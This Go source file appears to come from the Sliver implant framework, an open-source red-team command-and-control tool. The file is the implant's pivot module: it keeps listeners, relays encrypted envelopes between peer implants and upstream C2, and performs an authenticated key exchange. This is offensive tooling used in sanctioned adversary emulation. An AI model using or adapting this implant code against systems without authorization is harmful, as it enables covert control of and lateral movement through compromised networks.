package pivots

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"net"
	"sync"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	consts "github.com/bishopfox/sliver/implant/sliver/constants"
	"github.com/bishopfox/sliver/implant/sliver/cryptography"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

const (
	readBufSize = 1024
)

var (
	ErrFailedWrite       = errors.New("failed to write")
	ErrFailedKeyExchange = errors.New("failed key exchange")

	pivotListeners = &sync.Map{}
	listenerID     = uint32(0)

	PeerID = PivotID() // This implant's Peer ID, a per-execution instance ID
)

// StartListener - Generic interface to a start listener function
type StartListener func(string, chan<- *pb.Envelope) (*PivotListener, error)

// GetListeners - Get a list of active listeners
func GetListeners() []*pb.PivotListener {
	listeners := []*pb.PivotListener{}
	pivotListeners.Range(func(key interface{}, value interface{}) bool {
		listener := value.(*PivotListener)
		listeners = append(listeners, listener.ToProtobuf())
		return true
	})
	return listeners
}

// AddListener - Add a listener
func AddListener(listener *PivotListener) {
	pivotListeners.Store(listener.ID, listener)
}

// StopListener - Stop a pivot listener
func StopListener(id uint32) {
	if listener, ok := pivotListeners.Load(id); ok {
		listener.(*PivotListener).Stop()
	}
}

// SendToPeer - Forward an envelope to a peer
func SendToPeer(envelope *pb.Envelope) bool {
	peerEnvelope := &pb.PivotPeerEnvelope{}
	err := proto.Unmarshal(envelope.Data, peerEnvelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to unmarshal peer envelope: %s", err)
		// {{end}}
		return false
	}

	// {{if .Config.Debug}}
	log.Printf("Peer Envelope: %v", peerEnvelope)
	log.Printf("Send to downstream pivot id: %d", peerEnvelope.PivotID)
	// {{end}}

	downstreamEnvelope := &pb.Envelope{
		Type: pb.MsgPivotPeerEnvelope,
		Data: peerEnvelope.Data,
	}
	err = proto.Unmarshal(peerEnvelope.Data, downstreamEnvelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to unmarshal downstream envelope: %s", err)
		// {{end}}
		return false
	}

	// NOTE: Yes linear search is bad, but there should be a very small
	// number of listeners and pivots so it should be fine
	sent := false // Controls iteration of outer loop
	pivotListeners.Range(func(key interface{}, value interface{}) bool {
		listener := value.(*PivotListener)
		listener.Pivots.Range(func(key interface{}, value interface{}) bool {
			pivot := value.(*NetConnPivot)
			if pivot.ID() == peerEnvelope.PivotID {
				pivot.Downstream <- downstreamEnvelope
				sent = true  // break from the outer loop
				return false // stop iterating inner loop
			}
			return true // keep iterating inner loop
		})
		return !sent // keep iterating while not sent
	})
	// {{if .Config.Debug}}
	if !sent {
		log.Printf("Failed to find pivot with id %d", peerEnvelope.PivotID)
	}
	// {{end}}
	return sent
}

// PivotListener - A pivot listener
type PivotListener struct {
	ID          uint32
	Type        pb.PivotType
	Listener    net.Listener
	Pivots      *sync.Map // ID -> NetConnPivot
	BindAddress string
	Upstream    chan<- *pb.Envelope
}

// ToProtobuf - Get the protobuf version of the pivot listener
func (l *PivotListener) ToProtobuf() *pb.PivotListener {
	pivotPeers := []*pb.PivotPeer{}
	l.Pivots.Range(func(key interface{}, value interface{}) bool {
		pivot := value.(*NetConnPivot)
		pivotPeers = append(pivotPeers, pivot.ToProtobuf())
		return true
	})
	return &pb.PivotListener{
		ID:          l.ID,
		Type:        l.Type,
		BindAddress: l.BindAddress,
		Pivots:      pivotPeers,
	}
}

// Stop - Stop the pivot listener
func (l *PivotListener) Stop() {
	// Close all peer connections before closing listener
	l.Pivots.Range(func(key interface{}, value interface{}) bool {
		value.(*NetConnPivot).Close()
		return true
	})
	l.Pivots = nil
	l.Listener.Close()
}

// PivotClose - Close a pivot connection
func (l *PivotListener) PivotClose(id int64) {
	if p, ok := l.Pivots.Load(id); ok {
		l.Pivots.Delete(id)
		p.(*NetConnPivot).Close()
	}
}

// ListenerID - Generate a new pivot id
func ListenerID() uint32 {
	listenerID++
	return listenerID
}

// PivotID - Generate a new pivot id
func PivotID() int64 {
	buf := make([]byte, 8)
	rand.Read(buf)
	return int64(binary.LittleEndian.Uint64(buf))
}

// NetConnPivot - A generic pivot connection to a peer via net.Conn
type NetConnPivot struct {
	id            int64
	conn          net.Conn
	readMutex     *sync.Mutex
	writeMutex    *sync.Mutex
	cipherCtx     *cryptography.CipherContext
	readDeadline  time.Duration
	writeDeadline time.Duration

	upstream   chan<- *pb.Envelope
	Downstream chan *pb.Envelope
}

// ID - ID of peer pivot
func (p *NetConnPivot) ID() int64 {
	return p.id
}

// ToProtobuf - Protobuf of pivot peer
func (p *NetConnPivot) ToProtobuf() *pb.PivotPeer {
	return &pb.PivotPeer{
		ID:            p.id,
		RemoteAddress: p.RemoteAddress(),
	}
}

// Start - Starts the TCP pivot connection handler
func (p *NetConnPivot) Start(pivots *sync.Map) {
	defer p.conn.Close()
	err := p.peerKeyExchange()
	if err != nil {
		return
	}
	// {{if .Config.Debug}}
	log.Printf("[pivot] peer key exchange completed successfully")
	// {{end}}

	// We don't want to register the peer prior to the key exchange
	// Add & remove self from listener pivots map
	pivots.Store(p.ID(), p)
	defer pivots.Delete(p.ID())

	go func() {
		defer close(p.Downstream)
		for {
			envelope, err := p.readEnvelope()
			if err != nil {
				return // Will return when connection is closed
			}
			if envelope.Type == pb.MsgPivotPing {
				// {{if .Config.Debug}}
				log.Printf("[pivot] received peer ping, sending peer pong ...")
				// {{end}}
				p.Downstream <- &pb.Envelope{
					Type: pb.MsgPivotPing,
					Data: envelope.Data,
				}
			} else {
				// {{if .Config.Debug}}
				log.Printf("[pivot] received peer envelope, upstreaming ...")
				// {{end}}
				envelopeData, _ := proto.Marshal(envelope)
				data, _ := proto.Marshal(&pb.PivotPeerEnvelope{
					PeerID:  PeerID, // This proccess' Peer ID
					PivotID: p.ID(), // The Pivot connection ID
					Name:    consts.SliverName,
					Data:    envelopeData,
				})
				p.upstream <- &pb.Envelope{
					ID:   0, // Pivot server implementation uses handlers, so ID must be zero
					Type: pb.MsgPivotPeerEnvelope,
					Data: data,
				}
			}
		}
	}()

	for envelope := range p.Downstream {
		err := p.writeEnvelope(envelope)
		if err != nil {
			return
		}
	}
}

// peerKeyExchange - Exchange session key with peer, it's important that we DO NOT write
// anything to the socket before we've validated the peer's key is properly signed.
func (p *NetConnPivot) peerKeyExchange() error {
	p.conn.SetReadDeadline(time.Now().Add(tcpPivotReadDeadline))
	peerHelloRaw, err := p.read()
	p.conn.SetReadDeadline(time.Time{})
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] peer read failure: %s", err)
		// {{end}}
		return ErrFailedKeyExchange
	}
	peerHello := &pb.PivotHello{}
	err = proto.Unmarshal(peerHelloRaw, peerHello)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] unmarshal failure: %s", err)
		// {{end}}
		return ErrFailedKeyExchange
	}
	validPeer := cryptography.MinisignVerify(peerHello.PublicKey, peerHello.PublicKeySignature)
	if !validPeer {
		// {{if .Config.Debug}}
		log.Printf("[pivot] invalid peer key")
		// {{end}}
		return ErrFailedKeyExchange
	}
	sessionKey := cryptography.RandomKey()
	p.cipherCtx = cryptography.NewCipherContext(sessionKey)
	ciphertext, err := cryptography.ECCEncryptToPeer(peerHello.PublicKey, peerHello.PublicKeySignature, sessionKey[:])
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] peer encryption failure: %s", err)
		// {{end}}
		return ErrFailedKeyExchange
	}
	publicKeyRaw, _ := base64.RawStdEncoding.DecodeString(cryptography.ECCPublicKey)
	peerResponse, _ := proto.Marshal(&pb.PivotHello{
		PublicKey:          publicKeyRaw,
		PublicKeySignature: cryptography.ECCPublicKeySignature,
		SessionKey:         ciphertext,
	})
	p.conn.SetWriteDeadline(time.Now().Add(tcpPivotWriteDeadline))
	err = p.write(peerResponse)
	p.conn.SetWriteDeadline(time.Time{})
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] peer write failure: %s", err)
		// {{end}}
		return ErrFailedKeyExchange
	}
	return nil
}

// write - Write a message to the TCP pivot with a length prefix
// it's unlikely we can't write the 4-byte length prefix in one write
// so we fail if we can't, messages may be much longer so we try to
// drain the message buffer if we didn't complete the write
func (p *NetConnPivot) write(message []byte) error {
	p.writeMutex.Lock()
	defer p.writeMutex.Unlock()
	n, err := p.conn.Write(p.lengthOf(message))
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Error writing message length: %v", err)
		// {{end}}
		return err
	}
	if n != 4 {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Error writing message length: %v", err)
		// {{end}}
		return ErrFailedWrite
	}

	total := 0
	for total < len(message) {
		n, err = p.conn.Write(message[total:])
		total += n
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[pivot] Error writing message: %v", err)
			// {{end}}
			return err
		}
	}
	return nil
}

func (p *NetConnPivot) read() ([]byte, error) {
	p.readMutex.Lock()
	defer p.readMutex.Unlock()
	dataLengthBuf := make([]byte, 4)
	n, err := p.conn.Read(dataLengthBuf)
	if err != nil || n != 4 {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Error (read msg-length): %v\n", err)
		// {{end}}
		return nil, err
	}

	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))
	readBuf := make([]byte, readBufSize)
	dataBuf := []byte{}
	totalRead := 0
	for {
		n, err := p.conn.Read(readBuf)
		dataBuf = append(dataBuf, readBuf[:n]...)
		totalRead += n
		if totalRead == dataLength {
			break
		}
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[pivot] read error: %s\n", err)
			// {{end}}
			return nil, err
		}
	}
	return dataBuf, err
}

func (p *NetConnPivot) lengthOf(message []byte) []byte {
	dataLengthBuf := new(bytes.Buffer)
	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(message)))
	return dataLengthBuf.Bytes()
}

// writeEnvelope - Write a complete envelope
func (p *NetConnPivot) writeEnvelope(envelope *pb.Envelope) error {
	data, err := proto.Marshal(envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Marshaling error: %s", err)
		// {{end}}
		return err
	}
	data, err = p.cipherCtx.Encrypt(data)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Encryption error: %s", err)
		// {{end}}
		return err
	}
	return p.write(data)
}

// readEnvelope - Read a complete envelope
func (p *NetConnPivot) readEnvelope() (*pb.Envelope, error) {
	data, err := p.read()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Error reading message: %v", err)
		// {{end}}
		return nil, err
	}
	data, err = p.cipherCtx.Decrypt(data)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Decryption error: %s", err)
		// {{end}}
		return nil, err
	}
	envelope := &pb.Envelope{}
	err = proto.Unmarshal(data, envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[pivot] Unmarshal envelope error: %v", err)
		// {{end}}
		return nil, err
	}
	return envelope, nil
}

// RemoteAddress - Remote address of peer
func (p *NetConnPivot) RemoteAddress() string {
	remoteAddr := p.conn.RemoteAddr()
	if remoteAddr != nil {
		return remoteAddr.String()
	}
	return ""
}

// Close - Close connection to peer
func (p *NetConnPivot) Close() error {
	return p.conn.Close()
}
